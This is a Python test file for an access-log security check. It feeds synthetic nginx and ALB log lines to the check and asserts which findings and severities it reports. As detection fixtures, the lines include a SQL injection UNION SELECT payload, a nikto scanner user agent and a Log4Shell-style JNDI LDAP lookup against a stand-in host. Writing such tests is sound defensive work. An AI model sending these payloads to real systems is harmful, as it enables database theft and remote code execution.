import asyncio
import datetime as dt
import gzip

from alertcheck.checks.files.logs_access import LogsAccessCheck

TODAY = dt.date(2026, 10, 21)


def write_log(ws, name, lines):
    path = ws / "inputs" / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def line(day, status=200, ip="198.51.100.1", path="/", ua="Mozilla/5.0", user="-"):
    ts = dt.date(2026, 1, 1) + dt.timedelta(days=day)
    return (
        f'{ip} - {user} [{ts:%d/%b/%Y}:12:00:00 +0000] "GET {path} HTTP/1.1" {status} 10 "-" "{ua}"'
    )


def run(make_ctx, inputs, lines_by_file, allowlist=None, **scope):
    ctx = make_ctx(inputs=inputs, **scope)
    ws = ctx.infra.workspace.root
    for name, lines in lines_by_file.items():
        write_log(ws, name, lines)
    if allowlist is not None:
        (ws / "inputs" / "allow.txt").write_text("\n".join(allowlist) + "\n")
    result = asyncio.run(LogsAccessCheck(today=TODAY).run(ctx))
    return ctx, result


def kinds(result):
    return {(f.evidence["kind"], f.severity.value) for f in result.findings}


def _input(path="inputs/a.log", fmt="nginx_combined"):
    return {"access_logs": [{"path": path, "format": fmt}]}


def test_attack_signature_with_200_is_high(make_ctx):
    lines = [line(d) for d in range(250, 290)]
    lines.append(line(289, path="/?id=1%20UNION%20SELECT%20pw%20FROM%20users", ip="203.0.113.9"))
    _, result = run(make_ctx, _input(), {"a.log": lines})
    sig = next(f for f in result.findings if f.evidence["kind"] == "attack_signature")
    assert sig.severity.value == "high"
    assert "sqli_union" in sig.evidence["signatures"]
    assert sig.ipa_items == ["P1-2"]


def test_scanner_ua_is_medium(make_ctx):
    lines = [line(d) for d in range(250, 290)]
    lines += [line(289, status=404, ua="nikto/2.5", path="/admin")]
    _, result = run(make_ctx, _input(), {"a.log": lines})
    sig = {f.evidence["kind"]: f for f in result.findings}["attack_signature"]
    assert sig.severity.value == "medium"  # no 200 hit


def test_5xx_spike(make_ctx):
    lines = []
    for d in range(250, 285):
        lines += [line(d, status=200)] * 20
    for _ in range(50):
        lines.append(line(289, status=503))
    _, result = run(make_ctx, _input(), {"a.log": lines})
    assert any(f.evidence["kind"] == "error_spike" for f in result.findings)


def test_coverage_30_not_90(make_ctx):
    # logs cover ~40 days ending today
    lines = [line((TODAY - dt.date(2026, 1, 1)).days - k) for k in range(0, 40)]
    _, result = run(make_ctx, _input(), {"a.log": lines})
    cov = next(c for c in result.coverage if c.check_id == "logs.access")
    assert "30日" in cov.detail or "P1-3" in cov.detail
    # the coverage finding names what is missing for the 90-day window
    gap = next(f for f in result.findings if f.evidence["kind"] == "coverage_gap")
    assert "90" in gap.description


def test_unexpected_200_with_allowlist(make_ctx):
    lines = [line(d, path="/allowed") for d in range(250, 285)]
    lines.append(line(289, path="/secret/admin.php", ip="203.0.113.5"))
    _, result = run(
        make_ctx,
        _input(),
        {"a.log": lines},
        allowlist=["^/allowed"],
        url_allowlist="inputs/allow.txt",
    )
    assert any(f.evidence["kind"] == "unexpected_200" for f in result.findings)


def test_single_ip_concentration(make_ctx):
    lines = [line(289, ip="203.0.113.9") for _ in range(100)]
    lines += [line(289, ip=f"198.51.100.{i}") for i in range(10)]
    _, result = run(make_ctx, _input(), {"a.log": lines})
    assert any(f.evidence["kind"] == "ip_concentration" for f in result.findings)


def test_gzip_and_multiple_files(make_ctx):
    ctx = make_ctx(
        inputs={
            "access_logs": [
                {"path": "inputs/a.log", "format": "nginx_combined"},
                {"path": "inputs/b.log.gz", "format": "nginx_combined"},
            ]
        }
    )
    ws = ctx.infra.workspace.root
    (ws / "inputs").mkdir(parents=True, exist_ok=True)
    write_log(ws, "a.log", [line(d) for d in range(250, 285)])
    (ws / "inputs" / "b.log.gz").write_bytes(
        gzip.compress(
            (
                "\n".join(
                    line(289, path="/?q=${jndi:ldap://e.test/x}", ip="203.0.113.1")
                    for _ in range(1)
                )
                + "\n"
            ).encode()
        )
    )
    result = asyncio.run(LogsAccessCheck(today=TODAY).run(ctx))
    assert any(f.evidence["kind"] == "attack_signature" for f in result.findings)


def test_missing_fields_low(make_ctx):
    lines = [line(d, user="-") for d in range(250, 285)]
    _, result = run(make_ctx, _input(), {"a.log": lines})
    assert ("missing_log_fields", "low") in kinds(result)


def test_no_logs_input_skipped(make_ctx):
    ctx = make_ctx(inputs={})
    assert [c.status for c in LogsAccessCheck(today=TODAY).plan(ctx)] == ["skipped_no_input"]


def test_missing_file_error(make_ctx):
    _, result = run(make_ctx, _input("inputs/nope.log"), {})
    assert result.coverage[0].status == "error"


def test_empty_client_ip_does_not_trigger_concentration(make_ctx):
    # ALB-style records with no IP should not produce an ip_concentration finding with ip=""
    lines = [
        'h2 2026-10-15T12:00:00Z app/x :0 10.0.0.1:80 0 0 0 200 200 0 10 "GET http://e.co/ HTTP/1.1" "UA" - - -'  # noqa: E501
        for _ in range(100)
    ]
    ctx = make_ctx(inputs={"access_logs": [{"path": "inputs/a.log", "format": "alb"}]})
    write_log(ctx.infra.workspace.root, "a.log", lines)
    result = asyncio.run(LogsAccessCheck(today=TODAY).run(ctx))
    assert not any(
        f.evidence["kind"] == "ip_concentration" and f.evidence.get("ip") == ""
        for f in result.findings
    )
